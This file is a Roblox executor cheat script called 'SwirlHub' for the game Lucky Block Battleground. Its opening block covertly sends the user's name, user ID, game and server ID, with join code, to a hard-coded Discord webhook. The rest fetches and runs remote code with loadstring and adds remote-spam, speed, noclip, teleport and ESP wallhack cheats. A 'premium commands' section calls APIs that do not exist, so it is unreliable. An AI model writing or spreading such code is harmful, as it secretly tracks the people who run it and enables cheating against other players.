local webhookURL = "https://discord.com/api/webhooks/1333133574412435467/dJtOBcbl4SuIv_2J05Ua3KS5C0y3a7SHI9D2sfVY_lEEf426Io_bt_xGNfy57mMVxl--"

local player = game.Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local gameId = game.PlaceId
local jobId = game.JobId
local playerCount = #game.Players:GetPlayers()

local jsJoinCode = [[
    fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
        const server = json.data.find(s => s.id === "]] .. jobId .. [[");
        if (server) {
            window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
        } else {
            console.log("Server not found.");
        }
    });
]]

local luaJoinScript = [[
local TeleportService = game:GetService("TeleportService")
TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
]]

local embed = {
    ["title"] = "Execution Log",
    ["description"] = "Here are the details of the player and game:",
    ["type"] = "rich",
    ["color"] = 0x000000, 
    ["fields"] = {
        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
        { ["name"] = "JavaScript Join Code", ["value"] = "```js\n" .. jsJoinCode .. "\n```", ["inline"] = false },
        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
    },
    ["footer"] = { ["text"] = "Execution Log - Roblox" },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local payload = game:GetService("HttpService"):JSONEncode({
    ["content"] = "",
    ["embeds"] = {embed}
})

local requestFunction = syn and syn.request or http_request or request
if requestFunction then
    requestFunction({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
else
    warn("Your executor does not support HTTP requests.")
end

--[[ Script for Premium vs Free Members with Notification System ]]
-- Ensure you are using this script responsibly and comply with Roblox rules and terms.

-- Define premium users (UserIDs or Player Names)
local PremiumUsers = {
    7922537696, -- Replace with actual UserIDs of premium members
    87654321
}

-- Utility function to check if a player is premium
local function isPremium(player)
    return table.find(PremiumUsers, player.UserId) ~= nil
end

-- Notify all players in the server
local function notifyAllPlayers(message)
    for _, player in pairs(game.Players:GetPlayers()) do
        player:SendNotification({
            Title = "Script Alert",
            Text = message,
            Duration = 5
        })
    end
end

-- Main script
game.Players.PlayerAdded:Connect(function(player)
    -- Detect when a player joins and check if they are premium or free
    local premiumStatus = isPremium(player) and "Premium" or "Free"
    
    -- Send notification to all players
    local message = player.Name .. " has joined the game using the script. Status: " .. premiumStatus
    notifyAllPlayers(message)

    -- Allow chat commands for premium members
    player.Chatted:Connect(function(message)
        local args = string.split(message, " ")
        local command = args[1]:sub(2) -- Remove the '.' prefix
        local targetPlayerName = args[2] -- Target player name (if any)

        -- Check if the player is premium
        if isPremium(player) then
            if command == "bring" then
                -- Find target player
                local targetPlayer = game.Players:FindFirstChild(targetPlayerName)
                if targetPlayer then
                    -- Teleport target player to the premium player's position
                    local targetCharacter = targetPlayer.Character
                    local premiumCharacter = player.Character
                    if targetCharacter and premiumCharacter then
                        local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
                        local premiumHRP = premiumCharacter:FindFirstChild("HumanoidRootPart")
                        if targetHRP and premiumHRP then
                            targetHRP.CFrame = premiumHRP.CFrame
                            player:SendNotification({Title = "Success", Text = "You brought " .. targetPlayerName, Duration = 3})
                        end
                    end
                else
                    player:SendNotification({Title = "Error", Text = "Player not found", Duration = 3})
                end
            else
                player:SendNotification({Title = "Error", Text = "Invalid command", Duration = 3})
            end
        else
            -- Notify free players they can't use commands
            player:SendNotification({Title = "Notice", Text = "You do not have access to premium commands.", Duration = 3})
        end
    end)
end)


local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
local Sense = loadstring(game:HttpGet('https://sirius.menu/sense'))()
local Window = Fluent:CreateWindow({
    Title = "SwirlHub - Lucky Block Battleground",
    SubTitle = "by Flames",
    TabWidth = 160,
    Size = UDim2.fromOffset(600, 500),
    Acrylic = true,
    Theme = "Darker",
    MinimizeKey = Enum.KeyCode.LeftControl
})

local Tabs = {
    Home = Window:AddTab({ Title = "Home", Icon = "home" }),
    Blocks = Window:AddTab({ Title = "Blocks", Icon = "square" }),
    Player = Window:AddTab({ Title = "LocalPlayer", Icon = "user" }),
    ESP = Window:AddTab({ Title = "ESP", Icon = "eye" })
}

local Options = Fluent.Options

local HomeSection = Tabs.Home:AddSection("Welcome")

HomeSection:AddParagraph({
    Title = "✨ Welcome to SwirlHub",
    Content = "Enjoy your experience in Lucky Block Battleground! Use the tabs to access features."
})

HomeSection:AddButton({
    Title = "🛑 Destroy Hub",
    Callback = function()
        Fluent:Destroy()
    end
})

HomeSection:AddButton({
    Title = "🔄 Rejoin Server",
    Callback = function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
    end
})

HomeSection:AddButton({
    Title = "🌍 Server Hop",
    Callback = function()
        local function hopToNewServer()
            local HttpService = game:GetService("HttpService")
            local servers = {}
            local cursor = nil

            repeat
                local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100"
                if cursor then
                    url = url .. "&cursor=" .. cursor
                end

                local success, result = pcall(function()
                    return HttpService:JSONDecode(game:HttpGet(url))
                end)

                if success and result and result.data then
                    for _, server in ipairs(result.data) do
                        if server.id ~= game.JobId and server.playing < server.maxPlayers then
                            table.insert(servers, server.id)
                        end
                    end
                    cursor = result.nextPageCursor
                else
                    break
                end
            until not cursor

            if #servers > 0 then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
            else
                warn("No available servers found.")
            end
        end

        hopToNewServer()
    end
})

local BlockSection = Tabs.Blocks:AddSection("Block Spawning")

local remoteEvents = {
    {Name = "Diamond Block", Event = game:GetService("ReplicatedStorage").SpawnDiamondBlock},
    {Name = "Galaxy Block", Event = game:GetService("ReplicatedStorage").SpawnGalaxyBlock},
    {Name = "Lucky Block", Event = game:GetService("ReplicatedStorage").SpawnLuckyBlock},
    {Name = "Rainbow Block", Event = game:GetService("ReplicatedStorage").SpawnRainbowBlock},
    {Name = "Super Block", Event = game:GetService("ReplicatedStorage").SpawnSuperBlock},
}

for _, remote in ipairs(remoteEvents) do
    BlockSection:AddButton({
        Title = "✨ Spawn " .. remote.Name,
        Callback = function()
            if remote.Event then
                remote.Event:FireServer()
            else
                warn("Remote event for " .. remote.Name .. " not found!")
            end
        end
    })
end

local AutoSection = Tabs.Blocks:AddSection("Auto Spawning")

for _, remote in ipairs(remoteEvents) do
    AutoSection:AddToggle("Auto" .. remote.Name:gsub(" ", ""), {
        Title = "🔄 Auto Spawn " .. remote.Name,
        Default = false,
        Callback = function(Value)
            local loopEnabled = Value
            task.spawn(function()
                while loopEnabled do
                    if remote.Event then
                        remote.Event:FireServer()
                    end
                    task.wait()
                end
            end)
        end
    })
end

local PlayerSection = Tabs.Player:AddSection("Player Settings")

local WalkSpeedSlider = Tabs.Player:AddSlider("WalkSpeed", {
    Title = "🏃 Walk Speed",
    Description = "Adjust your walking speed.",
    Min = 16,
    Max = 500,
    Default = 16,
    Rounding = 1,
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
    end
})

WalkSpeedSlider:OnChanged(function(Value)
    print("Walk Speed changed to:", Value)
end)

local JumpPowerSlider = Tabs.Player:AddSlider("JumpPower", {
    Title = "🚀 Jump Power",
    Description = "Adjust your jump power.",
    Min = 50,
    Max = 500,
    Default = 50,
    Rounding = 1,
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
    end
})

JumpPowerSlider:OnChanged(function(Value)
    print("Jump Power changed to:", Value)
end)

local GravitySlider = Tabs.Player:AddSlider("Gravity", {
    Title = "🌌 Gravity",
    Description = "Adjust the gravity.",
    Min = 0,
    Max = 196.2,
    Default = workspace.Gravity,
    Rounding = 0.1,
    Callback = function(Value)
        workspace.Gravity = Value
    end
})

GravitySlider:OnChanged(function(Value)
    print("Gravity changed to:", Value)
end)

local FieldOfViewSlider = Tabs.Player:AddSlider("FieldOfView", {
    Title = "🎥 Field of View",
    Description = "Adjust your camera's FOV.",
    Min = 70,
    Max = 120,
    Default = 70,
    Rounding = 1,
    Callback = function(Value)
        workspace.CurrentCamera.FieldOfView = Value
    end
})

FieldOfViewSlider:OnChanged(function(Value)
    print("Field of View changed to:", Value)
end)

PlayerSection:AddToggle("InfiniteJump", {
    Title = "🔁 Infinite Jump",
    Default = false,
    Callback = function(Value)
        _G.InfiniteJumpEnabled = Value
    end
})

game:GetService("UserInputService").JumpRequest:Connect(function()
    if _G.InfiniteJumpEnabled then
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

PlayerSection:AddToggle("NoClip", {
    Title = "🚪 NoClip",
    Default = false,
    Callback = function(Value)
        _G.NoClipEnabled = Value
        while _G.NoClipEnabled do
            for _, part in ipairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
            task.wait(0.1)
        end
    end
})

local function teleportTo(location)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = location
    end
end

local locations = {
    {name = "Base", position = CFrame.new(-1039.5282, -128.299408, 85.450943)},
    {name = "Middle", position = CFrame.new(-1041.23193, 190.831711, 90.9453735)},
    {name = "Pink Bridge", position = CFrame.new(-868.601929, 194.367462, 211.650894)},
    {name = "Purple Bridge", position = CFrame.new(-933.63385, 194.367462, 263.423431)},
    {name = "Red Bridge", position = CFrame.new(-1161.80469, 194.367447, 263.3815)},
    {name = "Blue Bridge", position = CFrame.new(-1215.68848, 194.367355, 198.300949)},
    {name = "Cyan Bridge", position = CFrame.new(-1215.79639, 194.367447, -30.0486374)},
    {name = "Green Bridge", position = CFrame.new(-1148.33435, 194.367462, -83.3314285)},
    {name = "Yellow Bridge", position = CFrame.new(-920.233826, 194.367462, -83.3137131)},
    {name = "Orange Bridge", position = CFrame.new(-868.59314, 194.367462, -16.6490135)},
}

local locationNames = {}
for _, location in ipairs(locations) do
    table.insert(locationNames, location.name)
end

if Tabs and Tabs.Player then

    Options.TeleportDropdown = Tabs.Player:AddDropdown("TeleportDropdown", {
        Title = "Teleport",
        Values = locationNames,
        Multi = false,
        Default = 1,
    })

    Options.TeleportDropdown:SetValue(locationNames[1])

    Options.TeleportDropdown:OnChanged(function(Value)
        for _, location in ipairs(locations) do
            if location.name == Value then
                teleportTo(location.position)
                break
            end
        end
    end)
else
    warn("Tabs.Player does not exist. Ensure the tab is correctly created.")
end

local EnableSection = Tabs.ESP:AddSection("Enable ESP")

EnableSection:AddToggle("EnableEnemyESP", {
    Title = "👹 Enemy ESP",
    Default = false,
    Callback = function(Value)
        Sense.teamSettings.enemy.enabled = Value
    end
})

local BoxSection = Tabs.ESP:AddSection("Box ESP Settings")

BoxSection:AddToggle("EnableBoxESP", {
    Title = "📦 Box ESP",
    Default = false,
    Callback = function(Value)
        Sense.teamSettings.enemy.box = Value
    end
})

BoxSection:AddColorpicker("BoxColor", {
    Title = "🎨 Box Color",
    Default = Color3.new(1, 0, 0),
    Callback = function(Value)
        Sense.teamSettings.enemy.boxColor[1] = Value
    end
})

BoxSection:AddToggle("EnableBoxOutline", {
    Title = "🖍️ Box Outline",
    Default = false,
    Callback = function(Value)
        Sense.teamSettings.enemy.boxOutline = Value
    end
})

BoxSection:AddColorpicker("BoxOutlineColor", {
    Title = "🎨 Box Outline Color",
    Default = Color3.new(),
    Callback = function(Value)
        Sense.teamSettings.enemy.boxOutlineColor[1] = Value
    end
})

BoxSection:AddToggle("EnableBoxFill", {
    Title = "📦 Box Fill",
    Default = false,
    Callback = function(Value)
        Sense.teamSettings.enemy.boxFill = Value
    end
})

BoxSection:AddColorpicker("BoxFillColor", {
    Title = "🎨 Box Fill Color",
    Default = Color3.new(1, 0, 0),
    Callback = function(Value)
        Sense.teamSettings.enemy.boxFillColor[1] = Value
    end
})

local HealthSection = Tabs.ESP:AddSection("Health ESP Settings")

HealthSection:AddToggle("EnableHealthBar", {
    Title = "❤️ Health Bar",
    Default = false,
    Callback = function(Value)
        Sense.teamSettings.enemy.healthBar = Value
    end
})

HealthSection:AddColorpicker("HealthyColor", {
    Title = "💚 Healthy Color",
    Default = Color3.new(0, 1, 0),
    Callback = function(Value)
        Sense.teamSettings.enemy.healthyColor = Value
    end
})

HealthSection:AddColorpicker("DyingColor", {
    Title = "❤️ Dying Color",
    Default = Color3.new(1, 0, 0),
    Callback = function(Value)
        Sense.teamSettings.enemy.dyingColor = Value
    end
})

HealthSection:AddToggle("EnableHealthText", {
    Title = "📝 Health Text",
    Default = false,
    Callback = function(Value)
        Sense.teamSettings.enemy.healthText = Value
    end
})

local TracerSection = Tabs.ESP:AddSection("Tracer ESP Settings")

TracerSection:AddToggle("EnableTracerESP", {
    Title = "🔧 Tracer ESP",
    Default = false,
    Callback = function(Value)
        Sense.teamSettings.enemy.tracer = Value
    end
})

TracerSection:AddColorpicker("TracerColor", {
    Title = "🎯 Tracer Color",
    Default = Color3.new(1, 0, 0),
    Callback = function(Value)
        Sense.teamSettings.enemy.tracerColor[1] = Value
    end
})

local ArrowSection = Tabs.ESP:AddSection("Off-Screen Arrow Settings")

ArrowSection:AddToggle("EnableOffScreenArrow", {
    Title = "➡️ Off-Screen Arrow",
    Default = false,
    Callback = function(Value)
        Sense.teamSettings.enemy.offScreenArrow = Value
    end
})

ArrowSection:AddColorpicker("OffScreenArrowColor", {
    Title = "🎨 Arrow Color",
    Default = Color3.new(1, 1, 1),
    Callback = function(Value)
        Sense.teamSettings.enemy.offScreenArrowColor[1] = Value
    end
})

local ChamsSection = Tabs.ESP:AddSection("Chams Settings")

ChamsSection:AddToggle("EnableChams", {
    Title = "✨ Chams",
    Default = false,
    Callback = function(Value)
        Sense.teamSettings.enemy.chams = Value
    end
})

ChamsSection:AddColorpicker("ChamsFillColor", {
    Title = "🎨 Chams Fill Color",
    Default = Color3.new(0.2, 0.2, 0.2),
    Callback = function(Value)
        Sense.teamSettings.enemy.chamsFillColor[1] = Value
    end
})

ChamsSection:AddColorpicker("ChamsOutlineColor", {
    Title = "🎨 Chams Outline Color",
    Default = Color3.new(1, 0, 0),
    Callback = function(Value)
        Sense.teamSettings.enemy.chamsOutlineColor[1] = Value
    end
})

Sense.Load()

Fluent:Notify({
    Title = "SwirlHub",
    Content = "Script Hub loaded successfully!",
    Duration = 5
})
